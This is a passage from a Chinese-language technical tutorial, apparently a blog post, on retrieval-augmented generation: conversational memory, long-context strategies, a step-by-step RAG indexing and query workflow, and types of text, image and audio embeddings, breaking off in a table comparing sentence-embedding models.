将对话向量存储到向量数据库中。</p></li><li><p><strong>检索相关历史:</strong> 当用户提出新的问题时，将当前问题也编码成向量，然后在向量数据库中检索与当前问题最相关的历史对话向量。</p></li><li><p><strong>构建 Prompt (带记忆):</strong> 将当前问题和检索到的相关历史对话片段一起构建成 Prompt，输入到 LLM 中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">相关对话历史:</span><br><span class="line">[检索到的历史对话片段，例如最近几轮对话，或者语义上最相关的对话]</span><br><span class="line"></span><br><span class="line">当前用户问题: [用户最新提出的问题]</span><br><span class="line">聊天机器人回复:</span><br></pre></td></tr></table></figure></li></ol></li></ul><ol start="5"><li><strong>LLM 生成回复:</strong> LLM 基于 Prompt 中的当前问题和相关历史对话，生成回复。</li></ol><ul><li><p><strong>优点:</strong> 可以突破 Context Window 的限制，实现更长程的对话记忆，提升对话连贯性和用户体验。</p></li><li><p><strong>缺点:</strong> 需要维护外部记忆模块，记忆模块的质量和检索效果会影响对话系统性能。</p></li></ul><p><strong>5. 模型微调 (Fine-tuning) 或 Prompt 工程 (Prompt Engineering)</strong></p><ul><li><p><strong>策略:</strong> 针对特定的长上下文任务，可以通过 <strong>模型微调 (Fine-tuning)</strong> 或 <strong>Prompt 工程 (Prompt Engineering)</strong> 的方法，来提高模型在有限 Context Window 下的处理能力。</p></li><li><p><strong>模型微调:</strong> 可以使用长文本数据集，对 LLM 进行微调，让模型 <strong>更擅长处理长序列输入</strong>。 例如，可以使用更长的训练序列长度，或者采用一些针对长序列优化的训练技巧。</p></li><li><p><strong>Prompt 工程:</strong> 设计更 <strong>精巧、高效的 Prompt</strong>，例如：</p><ul><li><p><strong>使用更简洁的指令:</strong> 在 Prompt 中使用更精炼的语言，减少冗余信息。</p></li><li><p><strong>引导模型关注关键信息:</strong> 在 Prompt 中明确指示模型需要关注哪些关键信息，忽略哪些不重要的信息。</p></li><li><p><strong>利用少样本学习 (Few-shot Learning):</strong> 在 Prompt 中提供一些长上下文任务的示例，引导模型学习处理长上下文的方法。</p></li><li><p><strong>思维链提示 (Chain-of-Thought Prompting):</strong> 引导模型进行逐步推理，分解复杂任务，降低对长上下文的依赖。</p></li></ul></li><li><p><strong>适用场景:</strong> 适用于各种长上下文任务，可以与其他策略 (例如文本摘要、分块、检索) 结合使用，进一步提升效果。</p></li><li><p><strong>优点:</strong> 可以更精细地控制模型行为，针对特定任务进行优化。</p></li><li><p><strong>缺点:</strong> 模型微调需要更多的数据和计算资源，Prompt 工程需要一定的经验和技巧。</p></li></ul><h1><span id="rag-实现技术流程分解-detailed-technical-workflow">RAG 实现技术流程分解 (Detailed Technical Workflow)</span></h1><p>RAG 的核心流程可以分为两个主要阶段： <strong>离线索引构建阶段 (Offline Indexing)</strong> 和 **在线查询与生成阶段 (Online Query &amp; Generation)**。</p><p><strong>I. 离线索引构建阶段 (Offline Indexing/Knowledge Base Preparation):</strong></p><p>这个阶段的目标是构建一个高效、可检索的向量数据库，作为 RAG 系统的知识库。 通常在系统部署前或定期进行。</p><ol><li><p><strong>数据获取与收集 (Data Acquisition &amp; Collection):</strong></p><ul><li><p><strong>确定数据源:</strong> 明确 RAG 系统需要利用的知识来源。 数据源可以是：</p><ul><li><p><strong>文档集合:</strong> PDF 文档, Word 文档, TXT 文档, HTML 网页, Markdown 文件, 电子书等。</p></li><li><p><strong>数据库:</strong> 关系型数据库 (SQL), NoSQL 数据库 (MongoDB, Cassandra 等)。</p></li><li><p><strong>知识图谱:</strong> 结构化的知识库，如 Wikidata, DBpedia, 自建知识图谱等。</p></li><li><p><strong>API 数据:</strong> 从外部 API 获取的实时数据或结构化信息。</p></li><li><p><strong>多媒体数据:</strong> 图像, 音频, 视频 (需要相应的处理和嵌入技术)。</p></li></ul></li><li><p><strong>数据采集工具:</strong> 根据数据源类型选择合适的采集工具：</p><ul><li><p><strong>网页爬虫 (Web Scrapers):</strong> Scrapy, Beautiful Soup, Puppeteer 等，用于抓取网页内容。</p></li><li><p><strong>数据库连接器 (Database Connectors):</strong> JDBC, ODBC, 各种数据库的 Python 客户端 (PyMySQL, psycopg2, pymongo 等)，用于连接和读取数据库数据。</p></li><li><p><strong>API 客户端 (API Clients):</strong> Requests, aiohttp 等 HTTP 客户端，用于调用和获取 API 数据。</p></li><li><p><strong>文件读取库 (File Reading Libraries):</strong> PyPDF2, python-docx, python-pptx, unstructured 等，用于读取不同格式的文件内容。</p></li></ul></li></ul></li><li><p><strong>数据预处理与清洗 (Data Preprocessing &amp; Cleaning):</strong></p><ul><li><p><strong>格式转换与标准化 (Format Conversion &amp; Normalization):</strong> 将不同格式的数据统一转换为便于处理的格式，例如统一编码 (UTF-8), 统一文档格式 (Markdown, TXT)。</p></li><li><p><strong>文本清洗 (Text Cleaning):</strong> 去除噪声数据，提高文本质量：</p><ul><li><p><strong>去除 HTML 标签、XML 标签、Markdown 语法等标记语言的格式化符号。</strong></p></li><li><p><strong>去除特殊字符、乱码字符、URL、邮箱地址、电话号码等无关信息 (根据需求决定)。</strong></p></li><li><p><strong>去除重复内容 (文档去重、段落去重、句子去重)。</strong></p></li><li><p><strong>处理缩写、拼写错误、语法错误 (可选，根据需求和资源决定)。</strong></p></li></ul></li><li><p><strong>结构化处理 (Structuring):</strong> 将非结构化文本转换为半结构化或结构化形式，方便后续分块和检索：</p><ul><li><p><strong>文档结构解析:</strong> 识别文档的标题、章节、段落、列表、表格等结构信息。 可以使用 NLP 工具 (SpaCy, NLTK) 或专门的文档解析库 (unstructured, Document AI)。</p></li><li><p><strong>表格数据提取:</strong> 从文档中提取表格数据，转换为结构化表格 (例如 CSV, JSON)。</p></li><li><p><strong>知识图谱构建 (可选):</strong> 从文档中抽取实体和关系，构建知识图谱 (如果需要支持基于知识图谱的检索)。</p></li></ul></li></ul></li><li><p><strong>文本分块 (Text Chunking/Segmentation):</strong></p><ul><li><p><strong>将文档分割成更小的文本块 (Chunks):</strong> 为了限制上下文长度，提高检索精度和生成效率，需要将长文档分割成更小的、语义相关的文本块。</p></li><li><p><strong>分块策略选择:</strong> 根据文档类型、内容特点和 RAG 系统需求选择合适的分块策略：</p><ul><li><p><strong>固定大小分块 (Fixed-size Chunking):</strong> 按固定词语数量或字符数量分割，简单快速，但可能破坏语义完整性。</p></li><li><p><strong>语义分块 (Semantic Chunking):</strong> 根据句子、段落、章节等语义单元分割，保持语义完整性，常用方法包括：</p><ul><li><p><strong>句子分割:</strong> 使用句子分割模型 (例如 SpaCy, NLTK 的句子分割器) 将文档分割成句子。</p></li><li><p><strong>段落分割:</strong> 根据段落分隔符 (例如空行) 分割成段落。</p></li><li><p><strong>章节分割:</strong> 根据章节标题分割成章节。</p></li></ul></li><li><p><strong>递归分块 (Recursive Chunking):</strong> 先按较大粒度 (如章节) 分割，再对每个大块递归地按较小粒度 (如段落、句子) 分割，保留文档层次结构。</p></li><li><p><strong>重叠分块 (Overlapping Chunking):</strong> 相邻块之间存在一定的重叠部分，增加上下文连续性。</p></li><li><p><strong>实体感知分块 (Entity-Aware Chunking):</strong> 围绕实体进行分块，确保实体及其相关上下文在同一块内。</p></li><li><p><strong>根据文档类型定制分块策略:</strong> 例如代码文档按代码块分割，论文按章节或段落分割。</p></li></ul></li><li><p><strong>分块工具:</strong> 可以使用 Python NLP 库 (NLTK, SpaCy, Sentence Transformers), LangChain 等 RAG 框架提供的分块工具，或自定义分块脚本。</p></li><li><p><strong>分块大小优化:</strong> 实验不同的分块大小，评估 RAG 系统性能，选择最佳分块大小。</p></li></ul></li><li><p><strong>嵌入生成 (Embedding Generation):</strong></p><ul><li><p><strong>将文本块转换为向量表示 (Embeddings):</strong> 使用 Embedding 模型将每个文本块转换为高维向量，捕捉其语义信息。</p></li><li><p><strong>选择合适的 Embedding 模型:</strong> 根据任务类型、数据特点和性能需求选择合适的 Embedding 模型：</p><ul><li><p><strong>Sentence Embeddings 模型 (Sentence-BERT, OpenAI Embeddings, Cohere Embeddings, Jina Embeddings 等):</strong> 现代 RAG 系统常用，擅长句子/段落级别语义表示。</p></li><li><p><strong>词向量模型 (Word2Vec, GloVe, FastText):</strong> 轻量级，适用于资源受限场景，或作为基础组件。</p></li><li><p><strong>领域特定 Embedding 模型:</strong> 针对特定领域数据微调或预训练的 Embedding 模型，提升领域任务精度。</p></li><li><p><strong>多语言 Embedding 模型:</strong> 支持多语言的 Embedding 模型，用于多语言 RAG 系统。</p></li></ul></li><li><p><strong>Embedding 模型服务:</strong> 可以选择：</p><ul><li><p><strong>本地部署 Embedding 模型:</strong> 使用 Sentence-Transformers 库等在本地加载和运行开源模型。</p></li><li><p><strong>云端 Embedding 服务 API:</strong> 使用 OpenAI Embeddings API, Cohere Embeddings API, Azure OpenAI Embeddings API 等云服务，方便快捷，性能通常更优，但需付费。</p></li></ul></li><li><p><strong>批量嵌入生成:</strong> 为了提高效率，通常采用批量处理的方式，一次性生成多个文本块的 Embedding 向量。</p></li></ul></li><li><p><strong>向量数据库索引构建与存储 (Vector Database Indexing &amp; Storage):</strong></p><ul><li><p><strong>选择向量数据库:</strong> 根据性能、规模、功能、成本、易用性等因素选择合适的向量数据库 (如 Pinecone, Weaviate, Milvus, Qdrant, Chroma 等)。 云端托管或自托管根据需求选择。</p></li><li><p><strong>创建索引:</strong> 在向量数据库中创建索引，用于加速相似性搜索。 选择合适的索引类型 (HNSW, IVF, Flat 等) 和距离度量 (cosine, Euclidean, dot product) 。</p></li><li><p><strong>存储向量和元数据:</strong> 将生成的文本块 Embedding 向量以及相关的元数据 (例如文档 ID, 块 ID, 原始文本内容等) 存储到向量数据库中。 元数据用于过滤和关联原始文本。</p></li><li><p><strong>批量数据导入:</strong> 使用向量数据库提供的批量导入功能，高效地将大量向量数据导入到数据库中。</p></li></ul></li></ol><p><strong>II. 在线查询与生成阶段 (Online Query &amp; Generation/Inference Time):</strong></p><p>这个阶段是当用户发起查询时，RAG 系统实时检索相关信息并生成答案的过程。</p><ol><li><p><strong>用户查询接收与处理 (User Query Reception &amp; Processing):</strong></p><ul><li><p><strong>接收用户查询:</strong> RAG 系统接收用户的自然语言查询 (例如通过 Web 界面, API 接口, 聊天机器人等)。</p></li><li><p><strong>查询预处理 (Query Preprocessing):</strong> 对用户查询进行必要的预处理，例如：</p><ul><li><p><strong>文本清洗:</strong> 去除查询中的噪声字符、特殊符号等。</p></li><li><p><strong>拼写检查和纠错 (可选):</strong> 纠正用户查询中的拼写错误。</p></li><li><p><strong>查询改写 (Query Rewriting) (可选):</strong> 将用户查询改写为更适合检索系统的形式 (例如使用同义词、扩展关键词)。</p></li></ul></li></ul></li><li><p><strong>查询向量化 (Query Vectorization/Embedding):</strong></p><ul><li><p><strong>使用与离线索引阶段相同的 Embedding 模型:</strong> 将用户查询文本转换为向量表示，确保查询向量和文档向量在同一语义空间。</p></li><li><p><strong>实时嵌入生成:</strong> 在线实时生成查询的 Embedding 向量。 通常需要低延迟的 Embedding 模型推理服务。</p></li></ul></li><li><p><strong>向量相似性搜索 (Vector Similarity Search/Retrieval):</strong></p><ul><li><p><strong>在向量数据库中进行相似性搜索:</strong> 使用查询向量在向量数据库中执行相似性搜索，查找与查询向量最相似的 K 个文档块 (或向量)。 K 值 (检索结果数量) 通常需要根据应用场景和性能需求调整。</p></li><li><p><strong>选择合适的相似性搜索算法:</strong> 向量数据库会根据索引类型选择高效的相似性搜索算法 (例如 HNSW 索引通常使用贪心搜索算法)。</p></li><li><p><strong>元数据过滤 (Metadata Filtering) (可选):</strong> 在相似性搜索过程中，可以根据元数据进行过滤，例如只检索特定来源、特定时间范围或特定主题的文档块，提高检索精度。</p></li></ul></li><li><p><strong>上下文信息获取 (Context Information Retrieval):</strong></p><ul><li><p><strong>从向量数据库获取检索到的文档块:</strong> 根据相似性搜索的结果，从向量数据库中获取检索到的最相关的文档块 (包括原始文本内容和元数据)。</p></li><li><p><strong>上下文排序和选择 (Context Ranking &amp; Selection) (可选):</strong> 对检索到的文档块进行排序和选择，例如根据相关性评分排序，或选择相关性评分最高的 Top N 个块。 也可以根据其他指标 (例如文档质量、信息密度) 进行排序和选择。</p></li></ul></li><li><p><strong>Prompt 构建 (Prompt Construction):</strong></p><ul><li><p><strong>构建 Prompt 输入 LLM:</strong> 将用户查询和检索到的上下文信息组合成一个 Prompt，作为大型语言模型 (LLM) 的输入。 Prompt 的设计至关重要，直接影响 LLM 的生成效果。</p></li><li><p><strong>Prompt 模板设计:</strong> 设计清晰、明确、有效的 Prompt 模板，引导 LLM 更好地利用上下文信息生成答案。 常见的 Prompt 结构包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;请根据以下上下文信息回答问题：\n\n上下文信息:\n[检索到的文档块 1]\n[检索到的文档块 2]\n...\n[检索到的文档块 K]\n\n问题：[用户查询]\n\n答案：&quot;</span><br></pre></td></tr></table></figure><p>content_copydownload</p><p>Use code <a href="https://support.google.com/legal/answer/13505487">with caution</a>.</p></li><li><p><strong>上下文窗口管理:</strong> 控制 Prompt 的总长度，避免超出 LLM 的上下文窗口限制。 可以采用截断、压缩、摘要等方法处理过长的上下文。</p></li><li><p><strong>Prompt 工程技巧:</strong> 可以尝试 Few-shot Prompting (提供示例), Instruction Tuning (使用指令微调后的 LLM), Chain-of-Thought Prompting 等高级 Prompt 工程技巧，进一步优化生成效果。</p></li></ul></li><li><p><strong>LLM 推理与答案生成 (LLM Inference &amp; Answer Generation):</strong></p><ul><li><p><strong>调用 LLM API 进行推理:</strong> 将构建好的 Prompt 输入到预训练的 LLM (例如 OpenAI GPT-3.5 Turbo, GPT-4, Google PaLM 2, Meta Llama 2, Anthropic Claude 2 等) 的 API 接口，进行推理，生成答案文本。</p></li><li><p><strong>LLM 参数配置:</strong> 根据需求配置 LLM 的生成参数，例如：</p><ul><li><p><strong>Temperature:</strong> 控制生成文本的随机性 (temperature 越高，随机性越高，temperature 越低，确定性越高)。</p></li><li><p><strong>Top_p/Top_k:</strong> 控制采样策略，限制生成词语的范围。</p></li><li><p><strong>Max Tokens:</strong> 限制生成答案的最大长度。</p></li></ul></li><li><p><strong>流式输出 (Streaming Output) (可选):</strong> 为了提高用户体验，可以使用 LLM 的流式输出功能，逐步返回生成结果，而不是等待整个答案生成完毕。</p></li></ul></li><li><p><strong>答案后处理与优化 (Answer Post-processing &amp; Optimization):</strong></p><ul><li><p><strong>答案抽取 (Answer Extraction) (可选):</strong> 从 LLM 生成的答案文本中抽取最核心、最相关的答案片段，去除冗余信息。</p></li><li><p><strong>答案聚合 (Answer Aggregation) (可选):</strong> 如果从多个文档块中检索到相关信息，可以将 LLM 基于不同上下文生成的答案进行聚合，整合为一个更全面的答案。</p></li><li><p><strong>答案润色与格式化 (Answer Refinement &amp; Formatting) (可选):</strong> 对 LLM 生成的答案进行润色、语法纠错、格式化 (例如 Markdown 格式化, 列表格式化)，提高答案的可读性和用户体验。</p></li><li><p><strong>引用来源添加 (Citation/Source Linking) (可选):</strong> 在答案中添加对原始文档来源的引用链接或标注，提高答案的可信度和可追溯性。</p></li><li><p><strong>事实性验证 (Fact Verification) (可选):</strong> 对 LLM 生成的答案进行事实性验证，检查答案是否与检索到的文档信息一致，避免幻觉问题。 可以使用事实性检测模型或知识图谱进行验证。</p></li></ul></li><li><p><strong>答案呈现与用户交互 (Answer Presentation &amp; User Interaction):</strong></p><ul><li><p><strong>将生成的答案呈现给用户:</strong> 将后处理后的答案文本呈现给用户 (例如在 Web 界面, 聊天机器人界面, API 返回结果中)。</p></li><li><p><strong>用户反馈收集 (User Feedback Collection) (可选):</strong> 收集用户对答案的反馈 (例如点赞、踩、评价)，用于后续 RAG 系统的迭代优化。</p></li><li><p><strong>多轮对话管理 (Multi-turn Conversation Management) (可选):</strong> 如果 RAG 系统支持多轮对话，需要管理对话历史，维护对话状态，以便在后续对话中利用上下文信息。</p></li></ul></li></ol><h1><span id="向量嵌入">向量嵌入</span></h1><p>在向量数据库中，”嵌入 (Embeddings)” 是将各种类型的数据 (例如文本、图像、音频等) 转换成 <strong>高维向量</strong> 的过程。这些向量能够捕捉数据的语义信息或特征，使得计算机可以进行相似性比较和语义理解。 在 RAG (Retrieval-Augmented Generation) 系统中，嵌入技术至关重要，因为它允许我们将文档库中的文本内容转换为向量，并使用户的查询也转换为向量，然后在向量空间中进行相似性搜索，从而检索到最相关的上下文信息。</p><p>以下详细介绍几种常见的向量库嵌入类型，它们的不同之处以及各自的适用场景：</p><p><strong>常见的向量库嵌入类型 (Embeddings for Vector Databases):</strong></p><p>我们可以将向量库中常用的嵌入类型主要分为以下几类，并重点关注文本嵌入，因为在 RAG 应用中，文本数据是最常见的。</p><p><strong>1. 文本嵌入 (Text Embeddings):</strong></p><p>文本嵌入是将文本 (单词、句子、段落、文档) 转换为向量表示的技术，旨在捕捉文本的语义信息。</p><ul><li><p><strong>a) 基于词袋模型 (Bag-of-Words, BoW) 和 TF-IDF 的嵌入 (不太常用，但作为基础概念了解):</strong></p><ul><li><p><strong>原理:</strong> BoW 模型统计词语在文档中出现的频率，忽略词序和语法。 TF-IDF (Term Frequency-Inverse Document Frequency) 在 BoW 的基础上，对词语频率进行加权，降低常见词语的权重，提高关键词的权重。</p></li><li><p><strong>向量表示:</strong> 每个文档被表示为一个向量，向量的维度是词汇表的大小，每个维度的值是词语的频率或 TF-IDF 值。</p></li><li><p><strong>优点:</strong> 简单易实现，计算速度快。</p></li><li><p><strong>缺点:</strong> 丢失词序信息，无法捕捉语义关系，向量维度高且稀疏，效果有限，<strong>在现代 RAG 系统中已不常用</strong>。</p></li><li><p><strong>适用场景:</strong> 早期的文本检索、文本分类任务，作为理解文本向量化概念的基础。</p></li></ul></li><li><p><strong>b) 基于词向量模型 (Word Embeddings) 的句子/文档嵌入 (Word2Vec, GloVe, FastText):</strong></p><ul><li><p><strong>原理:</strong> Word2Vec (包括 CBOW 和 Skip-gram 模型)、GloVe (Global Vectors for Word Representation)、FastText 等模型通过神经网络训练，将每个词语映射到一个低维稠密向量空间，捕捉词语的语义信息和上下文关系。 要得到句子或文档嵌入，通常需要对词向量进行聚合 (例如平均池化、加权平均)。</p></li><li><p><strong>向量表示:</strong></p><ul><li><p><strong>词向量:</strong> 每个词语对应一个低维向量 (例如 100维、300维)。</p></li><li><p><strong>句子/文档向量:</strong> 通过对句子/文档中的词向量进行平均池化或其他聚合操作得到。</p></li></ul></li><li><p><strong>优点:</strong> 捕捉词语语义信息，向量维度较低，计算效率较高。</p></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>词向量模型本身是词级别的，句子/文档向量需要通过聚合得到，可能丢失句子/文档的整体语义信息。</strong></p></li><li><p><strong>Word2Vec 和 GloVe 无法很好地处理未登录词 (Out-of-Vocabulary, OOV) 问题。 FastText 通过词根信息部分缓解 OOV 问题。</strong></p></li><li><p><strong>对于复杂的句子或长文档，简单聚合词向量可能无法充分表达其语义。</strong></p></li></ul></li><li><p><strong>适用场景:</strong> 早期的语义相似度计算、文本分类、信息检索任务，作为构建更复杂句子/文档嵌入模型的基础。 <strong>现在在 RAG 系统中，通常作为基础组件，或在资源受限的情况下使用 FastText 等轻量级模型。</strong></p></li></ul></li><li><p><strong>c) 基于句子嵌入模型 (Sentence Embeddings) 的嵌入 (Sentence-BERT (SBERT), Universal Sentence Encoder (USE), OpenAI Embeddings, Cohere Embeddings, Jina Embeddings 等):</strong></p><ul><li><p><strong>原理:</strong> Sentence Embeddings 模型专门设计用于生成句子或段落级别的语义向量表示。 <strong>Sentence-BERT (SBERT)</strong> 是基于 Transformer 架构微调得到的句子嵌入模型，通过 Siamese 或 triplet 网络结构和对比学习目标函数，优化句子向量的语义相似度表示能力。 <strong>Universal Sentence Encoder (USE)</strong> 是 Google 开源的句子嵌入模型，有基于 Transformer 和基于 DAN (Deep Averaging Network) 的版本。 <strong>OpenAI Embeddings (text-embedding-ada-002)</strong> 和 <strong>Cohere Embeddings</strong> 是商业公司提供的云端句子嵌入服务，通常基于强大的 Transformer 模型，并经过大规模数据训练和优化。 <strong>Jina Embeddings</strong> 是 Jina AI 提供的开源嵌入模型，也包含多种模型选择。</p></li><li><p><strong>向量表示:</strong> 每个句子或段落直接被编码为一个低维稠密向量，向量维度通常在几百到几千维之间 (例如 SBERT 常用 768 维，OpenAI text-embedding-ada-002 为 1536 维)。</p></li><li><p><strong>优点:</strong></p><ul><li><p><strong>专门为句子/段落语义表示设计，能更好地捕捉句子/文档的整体语义信息。</strong></p></li><li><p><strong>通常基于 Transformer 等先进架构，性能强大。</strong></p></li><li><p><strong>Sentence-BERT 等开源模型易于使用和微调。 OpenAI Embeddings, Cohere Embeddings 等云服务易于集成和使用，且性能优秀。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>相比词向量模型，计算复杂度更高 (特别是基于 Transformer 的模型)。</strong></p></li><li><p><strong>对于非常长的文档，可能需要进行分块处理，再对块进行嵌入，或者使用专门处理长文本的模型 (如 Longformer, Transformer-XL 等)。</strong></p></li><li><p><strong>商业云服务 (OpenAI, Cohere) 需要付费，成本相对较高。</strong></p></li></ul></li><li><p><strong>适用场景:</strong> <strong>现代 RAG 系统中最常用的嵌入类型</strong>，适用于语义相似度搜索、文本聚类、文本分类、问答系统、信息检索等各种 NLP 任务。 <strong>Sentence-BERT 等开源模型适合本地部署和微调，OpenAI Embeddings, Cohere Embeddings 等云服务适合追求高性能和易用性的场景。</strong></p></li></ul></li><li><p><strong>d) 领域特定嵌入 (Domain-Specific Embeddings):</strong></p><ul><li><p><strong>原理:</strong> 在特定领域的数据集上训练或微调的嵌入模型，例如医学领域、法律领域、金融领域等。 可以使用 Sentence-BERT 等模型在领域数据上进行微调，或者使用领域预训练模型 (如果存在)。</p></li><li><p><strong>向量表示:</strong> 与句子嵌入模型类似，但更侧重于领域数据的语义表示。</p></li><li><p><strong>优点:</strong> <strong>在特定领域任务上，语义表示能力更强，检索和 RAG 精度更高。</strong></p></li><li><p><strong>缺点:</strong> <strong>通用性较差，只适用于特定领域。</strong> 需要领域数据集进行训练或微调，成本较高。</p></li><li><p><strong>适用场景:</strong> <strong>领域垂直的 RAG 系统</strong>，例如医学问答、法律咨询、金融信息检索等。 当通用嵌入模型在特定领域效果不佳时，可以考虑使用领域特定嵌入。</p></li></ul></li></ul><p><strong>2. 图像嵌入 (Image Embeddings):</strong></p><p>图像嵌入是将图像转换为向量表示的技术，捕捉图像的视觉特征和语义信息。 在多模态 RAG 系统中，可能需要对图像进行嵌入。</p><ul><li><p><strong>a) 基于卷积神经网络 (CNN) 的图像嵌入 (ResNet, EfficientNet, VGG, Inception 等):</strong></p><ul><li><p><strong>原理:</strong> 使用预训练的 CNN 模型 (例如 ResNet, EfficientNet) 提取图像的特征图，然后通过全局平均池化 (Global Average Pooling, GAP) 或其他池化操作将特征图转换为固定长度的向量。</p></li><li><p><strong>向量表示:</strong> 每个图像被表示为一个低维稠密向量，向量维度取决于 CNN 模型的输出维度 (例如 ResNet50 通常输出 2048 维向量)。</p></li><li><p><strong>优点:</strong> <strong>成熟的图像特征提取方法，性能良好，预训练模型丰富。</strong></p></li><li><p><strong>缺点:</strong> <strong>主要捕捉图像的视觉特征，语义信息可能相对较弱 (相比多模态模型)。</strong> 对于语义理解要求高的任务，可能需要结合其他技术。</p></li><li><p><strong>适用场景:</strong> <strong>图像相似度搜索、图像分类、目标检测等计算机视觉任务。 在多模态 RAG 系统中，可以作为图像特征提取器，与其他模态的嵌入进行融合。</strong></p></li></ul></li><li><p><strong>b) 基于视觉 Transformer (Vision Transformer, ViT) 的图像嵌入 (ViT, Swin Transformer 等):</strong></p><ul><li><p><strong>原理:</strong> Vision Transformer (ViT) 将 Transformer 架构应用于图像处理，将图像分割成 Patch，作为序列输入 Transformer 进行处理，提取图像的全局和局部特征。 Swin Transformer 在 ViT 基础上引入滑动窗口注意力机制，进一步提升了图像任务的性能。</p></li><li><p><strong>向量表示:</strong> 每个图像被表示为一个低维稠密向量，向量维度取决于 ViT 或 Swin Transformer 模型的配置。</p></li><li><p><strong>优点:</strong> <strong>在图像分类、目标检测、语义分割等任务上取得了优秀成果，能更好地捕捉图像的全局上下文信息。</strong></p></li><li><p><strong>缺点:</strong> <strong>计算复杂度较高 (相比 CNN 模型)。</strong> 预训练模型相对 CNN 模型较少。</p></li><li><p><strong>适用场景:</strong> <strong>高性能图像识别、图像理解任务。 在多模态 RAG 系统中，可以作为图像特征提取器，尤其在需要捕捉图像全局语义信息的场景。</strong></p></li></ul></li><li><p><strong>c) 基于多模态模型 (Multimodal Models) 的图像嵌入 (CLIP, ALIGN 等):</strong></p><ul><li><p><strong>原理:</strong> CLIP (Contrastive Language-Image Pre-training) 和 ALIGN (Alignment Language-Image Network) 等多模态模型，通过对比学习方法，将图像和文本映射到同一个向量空间，使得语义相关的图像和文本的向量表示在向量空间中距离更近。</p></li><li><p><strong>向量表示:</strong> 每个图像被表示为一个低维稠密向量，该向量与文本向量处于同一语义空间，可以直接进行图像-文本相似度计算。</p></li><li><p><strong>优点:</strong> <strong>同时捕捉图像的视觉特征和语义信息，并与文本语义空间对齐，非常适合跨模态检索和多模态 RAG 任务。</strong> CLIP 模型尤其在零样本图像分类、图像-文本检索等任务上表现出色。</p></li><li><p><strong>缺点:</strong> <strong>模型结构相对复杂，训练数据和计算资源需求较高。</strong></p></li><li><p><strong>适用场景:</strong> <strong>多模态 RAG 系统 (图像-文本 RAG)，跨模态检索 (图像检索文本，文本检索图像)，零样本图像分类等任务。 CLIP 模型是多模态 RAG 的常用选择。</strong></p></li></ul></li></ul><p><strong>3. 音频嵌入 (Audio Embeddings):</strong></p><p>音频嵌入是将音频数据转换为向量表示的技术，捕捉音频的声学特征和语义信息。 在多模态 RAG 系统中，如果需要处理音频数据，则需要音频嵌入。</p><ul><li><p><strong>a) 基于声学特征的音频嵌入 (MFCC, Mel-spectrogram 等):</strong></p><ul><li><p><strong>原理:</strong> 提取音频的声学特征，例如 MFCC (梅尔频率倒谱系数)、Mel-spectrogram (梅尔频谱图) 等，然后将这些特征转换为向量表示。</p></li><li><p><strong>向量表示:</strong> 每个音频片段被表示为一个向量或向量序列，向量维度取决于声学特征的类型和参数设置。</p></li><li><p><strong>优点:</strong> <strong>传统的音频特征提取方法，计算效率较高，易于实现。</strong></p></li><li><p><strong>缺点:</strong> <strong>主要捕捉音频的声学特征，语义信息可能相对较弱。</strong> 对于语义理解要求高的任务，可能需要结合更高级的模型。</p></li><li><p><strong>适用场景:</strong> 音频分类、语音识别、音频相似度搜索等任务。 在多模态 RAG 系统中，可以作为音频特征提取器，与其他模态的嵌入进行融合。</p></li></ul></li><li><p><strong>b) 基于深度学习模型的音频嵌入 (VGGish, Wav2Vec2, HuBERT 等):</strong></p><ul><li><p><strong>原理:</strong> 使用预训练的深度学习模型 (例如 VGGish, Wav2Vec2, HuBERT) 提取音频的特征表示。 Wav2Vec2 和 HuBERT 是基于 Transformer 架构的自监督学习模型，在语音识别等任务上取得了优秀成果。</p></li><li><p><strong>向量表示:</strong> 每个音频片段被表示为一个低维稠密向量，向量维度取决于深度学习模型的输出维度。</p></li><li><p><strong>优点:</strong> <strong>能更好地捕捉音频的语义信息和上下文关系，尤其 Wav2Vec2 和 HuBERT 等自监督模型在语音识别等任务上性能强大。</strong></p></li><li><p><strong>缺点:</strong> <strong>计算复杂度较高 (相比声学特征方法)。</strong> 预训练模型相对声学特征方法较少 (针对特定音频任务的模型较多)。</p></li><li><p><strong>适用场景:</strong> 高性能语音识别、音频理解任务。 在多模态 RAG 系统中，可以作为音频特征提取器，尤其在需要捕捉音频语义信息的场景。</p></li></ul></li></ul><h1><span id="如何选择嵌入模型">如何选择嵌入模型？</span></h1><p><strong>Sentence Embeddings 模型对比一览表</strong></p><table><thead><tr><th>模型名称/类型</th><th>架构/方法</th><th>性能 (通用基准 MTEB)1</th><th>推理速度/延迟</th><th>向量维度</th><th>语言支持</th><th>训练数据/方法</th><th>易用性/部署</th><th>成本 (如适用)</th><th>优点</th><th>缺点</th><th>适用场景/推荐</th></tr></thead><tbody><tr><td><strong>Sentence-BERT (SBERT) 系列</strong></td><td>Transformer (BERT, RoBERTa, MPNet 等) 微调</td><td>高 (MTEB 排行榜前列)</td><td>中等-较慢</td><td>768-1024</td><td>多语言 (部分模型)</td><td>对预训练 Transformer 模型 (BERT, RoBERTa 等) 进行微调，使用 Siamese/Triplet 网络结构和对比学习目标函数，优化句子向量的语义相似度表示能力。</td><td>Python 库 (Sentence-Transformers)，易于使用，本地部署，支持微调</td><td>开源免费</td><td>高性能，句子语义表示能力强，模型选择丰富，开源免费，易于使用，支持微调，社区活跃</td><td>推理速度相对较慢 (Transformer)，模型文件较大，部分模型多语言支持有限，需要一定的 Transformer 和 PyTorch 基础</td><td><strong>现代 RAG 系统常用</strong>，语义相似度搜索，文本聚类，文本分类等各种 NLP 任务，需要高性能和开源可定制的场景，希望本地部署和微调</td></tr><tr><td><strong>Universal Sentence Encoder (USE)</strong></td><td>Transformer (USE-Transformer) / DAN (USE-DAN)</td><td>中等-较高</td><td>中等 (Transformer), 较快 (DAN)</td><td>512 (Transformer), 128 (DAN)</td><td>多语言</td><td>Google 开源，基于 Transformer (USE-Transformer) 和 Deep Averaging Network (USE-DAN) 两种架构，在大规模多语言文本数据上预训练，旨在提供通用的句子嵌入表示。</td><td>Python 库 (TensorFlow Hub, Sentence-Transformers)，易于使用，本地部署 (USE-DAN 轻量级易部署，USE-Transformer 部署相对复杂)</td><td>开源免费</td><td>通用句子嵌入模型，多语言支持，USE-DAN 轻量级速度快，USE-Transformer 性能较好，TensorFlow 